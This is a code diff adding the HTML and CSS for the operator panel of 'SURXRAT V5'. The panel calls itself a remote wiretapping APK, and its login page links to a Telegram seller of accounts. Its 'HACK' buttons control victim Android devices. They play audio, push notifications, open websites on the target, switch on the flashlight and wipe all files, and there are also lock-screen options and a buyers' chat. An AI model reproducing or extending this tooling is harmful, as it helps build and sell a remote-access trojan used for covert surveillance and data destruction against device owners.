+                            <circle cx="18" cy="16" r="3"></circle>
+                        </svg></div>
+                    <div class="mi-content">
+                        <div class="mi-label">Putar Musik</div>
+                        <input type="url" id="input-mus" class="mi-input" placeholder="URL audio musik..."
+                            value="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3">
+                    </div>
+                    <button class="hack-btn" onclick="sendControl('mus')">HACK</button>
+                </div>
+
+                <!-- Notification with Text Input -->
+                <div class="modal-item">
+                    <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                            <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                        </svg></div>
+                    <div class="mi-content">
+                        <div class="mi-label">Kirim Notifikasi</div>
+                        <input type="text" id="input-not" class="mi-input" placeholder="Masukkan teks notifikasi..."
+                            value="Pesan penting dari sistem">
+                    </div>
+                    <button class="hack-btn" onclick="sendControl('not')">HACK</button>
+                </div>
+
+                <!-- Format Storage (No Input) -->
+                <div class="modal-item">
+                    <div class="mi-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <polyline points="3 6 5 6 21 6"></polyline>
+                            <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2">
+                            </path>
+                            <line x1="10" y1="11" x2="10" y2="17"></line>
+                            <line x1="14" y1="11" x2="14" y2="17"></line>
+                        </svg></div>
+                    <div class="mi-content">
+                        <div class="mi-label">Hapus Semua File</div>
+                        <div class="mi-desc">⚠️ Peringatan: Tindakan ini tidak dapat dibatalkan!</div>
+                    </div>
+                    <button class="hack-btn" onclick="sendControl('for')">HACK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NEW: Universal Input/Confirm Modal (V2.7) -->
+    <div id="universal-modal" class="ios-modal-overlay hidden">
+        <div class="ios-modal">
+            <div class="ios-modal-content">
+                <h3 id="univ-modal-title">Judul</h3>
+                <p id="univ-modal-msg">Pesan konfirmasi...</p>
+                <div id="univ-input-container" class="hidden">
+                    <input type="text" id="univ-input" class="univ-text-input" placeholder="Ketik disini...">
+                </div>
+
+                <div class="ios-modal-actions">
+                    <button id="univ-cancel-btn" class="ios-btn-cancel">Batal</button>
+                    <button id="univ-confirm-btn" class="ios-btn-confirm">Ya</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NEW: Device Selection Modal (Moved to Root) -->
+    <div id="device-selection-modal" class="ios-modal-overlay hidden">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Pilih Perangkat</h3>
+                <button id="close-selection-btn" class="close-btn">&times;</button>
+            </div>
+            <div class="modal-subtext">Klik perangkat untuk menghapusnya secara permanen.</div>
+            <div id="delete-list-container" class="modal-list scrollable-list">
+                <!-- List items injected by JS -->
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+    <!-- Chat View (Root Level) -->
+    <div id="view-chat" class="hidden">
+        <div class="chat-header">
+            <div class="chat-header-info">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="9" cy="7" r="4"></circle>
+                    <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                </svg>
+                <div>
+                    <div class="chat-header-title">Komunitas Pengguna</div>
+                    <div class="chat-header-subtitle">tempat diskusi para buyer</div>
+                </div>
+            </div>
+            <button id="chat-close-btn" class="chat-close-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+        <div id="chat-messages">
+            <!-- Bubbles injected by JS -->
+        </div>
+
+        <!-- Reply Context (Hidden by default) -->
+        <div id="reply-preview" class="hidden">
+            <div class="reply-content">
+                <div class="reply-to-name" id="reply-name">Name</div>
+                <div class="reply-to-text" id="reply-text">Message text...</div>
+            </div>
+            <button id="reply-close-btn" class="reply-close-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+
+        <div class="chat-input-area">
+            <input type="text" id="chat-input" placeholder="Ketik pesan..." autocomplete="off">
+            <button id="chat-send-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="22" y1="2" x2="11" y2="13"></line>
+                    <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- Name Prompt Modal (Root Level) -->
+    <div id="chat-name-modal" class="ios-modal-overlay hidden">
+        <div class="name-prompt-card">
+            <h3>Bergabung ke Live Chat</h3>
+            <p style="color:rgba(255,255,255,0.7); font-size:0.9rem; margin-top:5px;">Masukkan nama unik Anda untuk
+                mulai mengobrol.</p>
+            <input type="text" id="chat-name-input" class="name-input" placeholder="Nama Panggilan" maxlength="15">
+            <button id="chat-join-btn" class="join-btn">MULAI CHAT</button>
+        </div>
+    </div>
+
+    <!-- User Info Modal (Admin Only) -->
+    <div id="user-info-modal" class="ios-modal-overlay hidden" style="z-index: 2200;">
+        <div class="user-info-card"
+            style="background: rgba(20,20,20,0.95); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 16px; width: 85%; max-width: 320px; text-align: left; position: relative;">
+            <button id="info-close-btn"
+                style="position: absolute; top: 10px; right: 10px; background: none; border: none; color: white;">&times;</button>
+            <h3 style="margin-top: 0; margin-bottom: 15px; color: #007aff;">User Details</h3>
+
+            <div style="margin-bottom: 10px;">
+                <div style="font-size: 0.75rem; color: #888;">Name</div>
+                <div id="info-name" style="font-size: 0.95rem; font-weight: 600;">-</div>
+            </div>
+
+            <div style="margin-bottom: 10px;">
+                <div style="font-size: 0.75rem; color: #888;">Email</div>
+                <div id="info-email" style="font-size: 0.95rem;">-</div>
+            </div>
+
+            <div style="margin-bottom: 10px;">
+                <div style="font-size: 0.75rem; color: #888;">UID</div>
+                <div id="info-uid" style="font-size: 0.8rem; font-family: monospace; color: #aaa;">-</div>
+            </div>
+
+            <div style="margin-bottom: 5px;">
+                <div style="font-size: 0.75rem; color: #888;">Joined Since</div>
+                <div id="info-date" style="font-size: 0.85rem;">-</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Premium Login Container -->
+    <div id="login-container" class="view">
+        <div class="login-wrapper">
+            <div class="login-header">
+                <h1 class="premium-title">SURXRAT <span class="v5">V5</span></h1>
+                <p class="premium-subtitle">APK SADAP JARAK JAUH</p>
+            </div>
+
+            <div class="login-card-v2">
+                <!-- Video Header -->
+                <div class="card-video-header-v2">
+                    <video autoplay muted loop playsinline>
+                        <source src="assets/welcome-D1B5UjYJ.mp4" type="video/mp4">
+                    </video>
+                    <div class="video-overlay-v2"></div>
+                </div>
+
+                <div class="login-body-v2">
+                    <div class="input-group">
+                        <label>EMAIL ANDA</label>
+                        <div class="input-wrapper">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+                                <polyline points="22,6 12,13 2,6" />
+                            </svg>
+                            <input type="text" id="auth-u" placeholder="nama@gmail.com" autocomplete="off"
+                                spellcheck="false">
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>KATA SANDI</label>
+                        <div class="input-wrapper">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                            </svg>
+                            <input type="text" id="auth-p" placeholder="••••••••" autocomplete="off"
+                                style="-webkit-text-security: disc; text-security: disc;">
+                        </div>
+                    </div>
+
+                    <div id="login-error" class="error-msg"></div>
+
+                    <button id="login-btn" onclick="login()" class="upgrade-btn">
+                        <span>MASUK</span>
+                        <div class="btn-shine"></div>
+                    </button>
+
+                    <a href="https://t.me/sisuryaofficialkuu" target="_blank" class="buy-account-link">
+                        BELI AKUN SURXRAT
+                    </a>
+
+                </div> <!-- End login-body-v2 -->
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- Control Menu Styles -->
+    <style>
+        /* Device Filter Bar */
+        .device-filter-bar {
+            display: flex;
+            gap: 10px;
+            padding: 0 16px 16px 16px;
+            overflow-x: auto;
+            scrollbar-width: none;
+        }
+
+        .device-filter-bar::-webkit-scrollbar {
+            display: none;
+        }
+
+        .filter-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--text-dim);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 800;
+            white-space: nowrap;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .filter-btn span {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-size: 0.6rem;
+        }
+
+        .filter-btn.active {
+            background: var(--accent-blue);
+            color: white;
+            border-color: var(--accent-blue);
+            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
+        }
+
+        .filter-btn.active span {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Control Menu Button */
+        .control-menu-btn {
+            position: fixed;
+            bottom: calc(80px + var(--safe-area-bottom));
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border: none;
+            color: white;
+            display: none;
+            /* Hidden by default */
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 30px rgba(59, 130, 246, 0.4);
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 100;
+        }
+
+        /* Show only in device list view */
+        #view-device-list:not(.hidden)~.control-menu-btn {
+            display: flex;
+        }
+
+        .control-menu-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 12px 40px rgba(59, 130, 246, 0.6);
+        }
+
+        .control-menu-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Bottom Nav Control Button */
+        .nav-control-btn {
+            position: relative;
+            margin-top: -30px;
+            /* Elevate button */
+            display: none;
+            /* Hidden until device selected */
+        }
+
+        .control-btn-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4),
+                0 4px 12px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 3px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .nav-control-btn:hover .control-btn-circle {
+            transform: scale(1.1);
+            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.5),
+                0 6px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        .nav-control-btn:active .control-btn-circle {
+            transform: scale(0.95);
+        }
+
+        .control-btn-circle svg {
+            width: 28px;
+            height: 28px;
+            color: white;
+        }
+
+        .nav-control-btn span {
+            margin-top: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        /* Hide bottom dock when control grid is open */
+        body:has(.control-grid-container.show) .premium-dock {
+            display: none !important;
+        }
+
+        /* Control Grid Container */
+        .control-grid-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(180deg, transparent 0%, rgba(0, 0, 0, 0.98) 5%);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            display: flex;
+            flex-direction: column;
+            transform: translateY(100%);
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 2000;
+            max-height: 85vh;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .control-grid-container.show {
+            transform: translateY(0);
+        }
+
+        .control-grid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 1rem;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* Wrap the grid in a scrollable area */
+        .control-grid-scrollbody {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1.5rem 1rem 120px;
+            scrollbar-width: none;
+        }
+
+        .control-grid-scrollbody::-webkit-scrollbar {
+            display: none;
+        }
+
+        .control-grid-back {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: #3b82f6;
+            /* Blue back button */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .control-grid-back:active {
+            transform: scale(0.9);
+            background: rgba(59, 130, 246, 0.2);
+        }
+
+        .control-grid-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: white;
+            flex: 1;
+            text-align: center;
+        }
+
+        .control-grid-close {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .control-grid-close:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        /* Control Grid */
+        /* === Refined Card List Design (User Request) === */
+        /* === Compact Control Grid (Color & Size Refined) === */
+        .control-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            /* Compact gap */
+            padding-bottom: 20px;
+        }
+
+        .ctrl-card {
+            display: flex;
+            align-items: center;
+            padding: 12px 14px;
+            /* Compact padding */
+            background: rgba(24, 24, 27, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            /* Smooth compact radius */
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .ctrl-card:active {
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(0.98);
+        }
+
+        /* Icon Container */
+        .ctrl-icon {
+            flex-shrink: 0;
+            width: 40px;
+            /* Compact Icon Box */
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 14px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+        }
+
+        .ctrl-icon svg {
+            width: 20px;
+            /* Compact SVG */
+            height: 20px;
+            stroke-width: 2;
+        }
+
+        /* Content */
+        .ctrl-content {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 2px;
+        }
+
+        .ctrl-title {
+            font-size: 0.95rem;
+            /* Compact Title */
+            font-weight: 600;
+            color: #fff;
+            line-height: 1.2;
+        }
+
+        .ctrl-desc {
+            font-size: 0.75rem;
+            /* Small Desc */
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.2;
+            letter-spacing: 0.2px;
+        }
+
+        .ctrl-arrow {
+            color: rgba(255, 255, 255, 0.2);
+            transition: transform 0.2s;
+        }
+
+        .ctrl-card:active .ctrl-arrow {
+            transform: translateX(3px);
+            color: var(--accent-red);
+        }
+
+        /* === Theme Colors (Vibrant & Colorful) === */
+        /* Blue */
+        .ctrl-icon.blue-theme {
+            background: rgba(59, 130, 246, 0.15);
+            color: #60a5fa;
+            border: 1px solid rgba(59, 130, 246, 0.1);
+        }
+
+        /* Zinc */
+        .ctrl-icon.zinc-theme {
+            background: rgba(255, 255, 255, 0.1);
+            color: #e4e4e7;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        /* Purple */
+        .ctrl-icon.purple-theme {
+            background: rgba(168, 85, 247, 0.15);
+            color: #c084fc;
+            border: 1px solid rgba(168, 85, 247, 0.1);
+        }
+
+        /* Emerald */
+        .ctrl-icon.emerald-theme {
+            background: rgba(16, 185, 129, 0.15);
+            color: #34d399;
+            border: 1px solid rgba(16, 185, 129, 0.1);
+        }
+
+        /* Amber */
+        .ctrl-icon.amber-theme {
+            background: rgba(245, 158, 11, 0.15);
+            color: #fbbf24;
+            border: 1px solid rgba(245, 158, 11, 0.1);
+        }
+
+        /* Rose */
+        .ctrl-icon.rose-theme {
+            background: rgba(244, 63, 94, 0.15);
+            color: #fb7185;
+            border: 1px solid rgba(244, 63, 94, 0.1);
+        }
+
+        /* Cyan */
+        .ctrl-icon.cyan-theme {
+            background: rgba(6, 182, 212, 0.15);
+            color: #22d3ee;
+            border: 1px solid rgba(6, 182, 212, 0.1);
+        }
+
+        /* Red */
+        .ctrl-icon.red-theme {
+            background: rgba(239, 68, 68, 0.15);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.1);
+        }
+
+        /* Modal Input Adjustments */
+        .ios-input-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .ios-input-modal.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .ios-input-card {
+            background: rgba(30, 30, 30, 0.98);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 340px;
+            padding: 1.5rem;
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .ios-input-modal.show .ios-input-card {
+            transform: scale(1);
+        }
+
+        .ios-input-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .ios-input-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.2), rgba(139, 92, 246, 0.2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+        }
+
+        .ios-input-icon svg {
+            width: 26px;
+            height: 26px;
+        }
+
+        .ios-input-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .ios-input-subtitle {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 0.2rem;
+        }
+
+        /* Floating Input */
+        .ios-floating-input {
+            position: relative;
+            margin-bottom: 2rem;
+            /* More spacing */
+        }
+
+        .ios-floating-input input {
+            width: 100%;
+            padding: 20px 16px 8px 16px;
+            /* Optimized padding for floating label */
+            background: rgba(40, 40, 45, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: white;
+            font-size: 1.1rem;
+            font-family: inherit;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            outline: none;
+            height: 56px;
+            /* Fixed height for consistency */
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .ios-floating-input input:focus {
+            border-color: #3b82f6;
+            background: rgba(50, 50, 55, 0.8);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15), 0 4px 12px rgba(0, 0, 0, 0.2);
+            transform: translateY(-1px);
+        }
+
+        /* [FIX] Remove red browser validation border for url/tel/number inputs */
+        .ios-floating-input input:invalid {
+            border-color: rgba(255, 255, 255, 0.1) !important;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1) !important;
+            outline: none !important;
+        }
+
+        .ios-floating-input label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.4);
+            /* Softer placeholder color */
+            font-size: 1rem;
+            pointer-events: none;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            background: transparent;
+            padding: 0 2px;
+            font-weight: 500;
+        }
+
+        .ios-floating-input input:focus+label,
+        .ios-floating-input input:not(:placeholder-shown)+label {
+            top: 14px;
+            font-size: 0.75rem;
+            color: #3b82f6;
+            transform: translateY(-50%);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+
+
+        .ios-floating-input input::placeholder {
+            opacity: 0;
+        }
+
+        /* iOS Buttons Fixed */
+        .ios-btn-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            width: 100%;
+            margin-top: 24px;
+        }
+
+        .ios-btn {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 16px;
+            border-radius: 14px;
+            border: none;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s active;
+            /* Ensure buttons don't hidden */
+            min-width: 80px;
+            white-space: nowrap;
+        }
+
+        .ios-btn:active {
+            transform: scale(0.96);
+            opacity: 0.9;
+        }
+
+        .ios-btn-cancel {
+            background: rgba(44, 44, 46, 1);
+            color: #fff;
+        }
+
+        .ios-btn-cancel:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .ios-btn-confirm {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            color: #fff;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+            font-weight: 700;
+        }
+
+        .ios-btn-confirm:hover {
+            background: linear-gradient(135deg, #60a5fa, #3b82f6);
+        }
+
+        .ios-btn-confirm:active {
+            transform: scale(0.96);
+            opacity: 0.9;
+        }
+
+        .ios-input-card {
+            background: #1c1c1e;
+            /* Darker card background */
+            width: 85%;
+            max-width: 320px;
+            border-radius: 20px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            animation: modalPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        /* Animations */
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .ctrl-card {
+            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1) backwards;
+        }
+
+        .ctrl-card:nth-child(1) {
+            animation-delay: 0.05s;
+        }
+
+        .ctrl-card:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+
+        .ctrl-card:nth-child(3) {
+            animation-delay: 0.15s;
+        }
+
+        .ctrl-card:nth-child(4) {
+            animation-delay: 0.2s;
+        }
+
+        .ctrl-card:nth-child(5) {
+            animation-delay: 0.25s;
+        }
+
+        .ctrl-card:nth-child(6) {
+            animation-delay: 0.3s;
+        }
+
+        .ctrl-card:nth-child(7) {
+            animation-delay: 0.35s;
+        }
+
+        .ctrl-card:nth-child(8) {
+            animation-delay: 0.4s;
+        }
+
+        .ctrl-card:nth-child(9) {
+            animation-delay: 0.45s;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .control-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .ctrl-card {
+                padding: 1rem;
+            }
+        }
+
+        /* [FIX] Hidden utility class */
+        .hidden {
+            display: none !important;
+        }
+
+        /* [FIX] Remove red browser validation border on required inputs */
+        input:invalid {
+            border-color: rgba(255, 255, 255, 0.15) !important;
+            box-shadow: none !important;
+        }
+
+        /* [FIX] ios-btn-confirm - use explicit blue instead of undefined CSS variable */
+        .ios-btn-confirm {
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%) !important;
+            color: white !important;
+            box-shadow: 0 4px 20px rgba(59, 130, 246, 0.4) !important;
+            font-weight: 700 !important;
+        }
+
+        .ios-btn-confirm:hover {
+            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%) !important;
+        }
+
+        /* Lock Modal Styles - Redesigned */
+        .lock-field-group {
+            width: 100%;
+        }
+
+        .lock-field-label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.68rem;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.45);
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin-bottom: 0;
+        }
+
+        .lock-field-label svg {
+            opacity: 0.6;
+            flex-shrink: 0;
+        }
+
+        /* Radio pill buttons for BG selection */
+        .lock-bg-options {
+            display: flex;
+            gap: 8px;
+            width: 100%;
+        }
+
+        .lock-bg-option {
+            flex: 1;
+            cursor: pointer;
+        }
+
+        .lock-bg-option input[type="radio"] {
+            display: none;
+        }
+
+        .lock-bg-option-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 10px 8px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            font-size: 0.72rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.5);
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            text-align: center;
+        }
+
+        .lock-bg-option-inner svg {
+            opacity: 0.5;
+            transition: opacity 0.2s;
+        }
+
+        .lock-bg-option input[type="radio"]:checked+.lock-bg-option-inner {
+            background: rgba(59, 130, 246, 0.12);
+            border-color: rgba(59, 130, 246, 0.5);
+            color: #60a5fa;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.08);
+        }
+
+        .lock-bg-option input[type="radio"]:checked+.lock-bg-option-inner svg {
+            opacity: 1;
+            stroke: #60a5fa;
+        }
+
+        .lock-bg-option:hover .lock-bg-option-inner {
+            background: rgba(255, 255, 255, 0.07);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .lock-bg-swatch {
+            width: 16px;
+            height: 16px;
+            border-radius: 4px;
+            display: block;
+        }
+
+        /* Old lock styles kept for compatibility */
+        .lock-section-label {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #888;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .lock-bg-select {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1.5px solid rgba(255, 255, 255, 0.12);
+            border-radius: 12px;
+            color: white;
+            font-size: 0.9rem;
+            outline: none;
+            appearance: none;
+            cursor: pointer;
+            box-sizing: border-box;
+        }
+
+        .lock-url-input {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1.5px solid rgba(255, 255, 255, 0.12);
+            border-radius: 12px;
+            color: white;
+            font-size: 0.9rem;
+            outline: none;
+            box-sizing: border-box;
+            margin-top: 8px;
+        }
+
+        .lock-section-divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.07);
+            margin: 14px 0;
+        }
+    </style>
+
+    <!-- Control Grid Container -->
+
+    <!-- Control Grid Container -->
+    <div class="control-grid-container" id="control-grid">
+        <div class="control-grid-header">
+            <button class="control-grid-back" onclick="toggleControlMenu()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="19" y1="12" x2="5" y2="12"></line>
+                    <polyline points="12 19 5 12 12 5"></polyline>
+                </svg>
+            </button>
+            <div class="control-grid-title">Pusat Kontrol</div>
+            <button class="control-grid-close" onclick="toggleControlMenu()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <line x1="18" y1="6" x2="6" y2="18"></line>
+                    <line x1="6" y1="6" x2="18" y2="18"></line>
+                </svg>
+            </button>
+        </div>
+
+        <div class="control-grid-scrollbody">
+            <div class="control-grid">
+                <!-- Open Web -->
+                <!-- Open Web -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('url', 'Buka Website', 'Masukkan URL (misal: google.com)', 'url', 'https://google.com')">
+                    <div class="ctrl-icon blue-theme">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <line x1="2" y1="12" x2="22" y2="12" />
+                            <path
+                                d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+                        </svg>
+                    </div>
+                    <div class="ctrl-content">
+                        <div class="ctrl-title">Buka Website</div>
+                        <div class="ctrl-desc">Remote browsing target</div>
+                    </div>
+                    <div class="ctrl-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M8.25 4.5l7.5 7.5-7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- Flashlight -->
+                <div class="ctrl-card"
+                    onclick="openControlInput('fla', 'Nyalakan Senter', 'Durasi (detik, 0=permanen)', 'number', '10')">
+                    <div class="ctrl-icon zinc-theme">
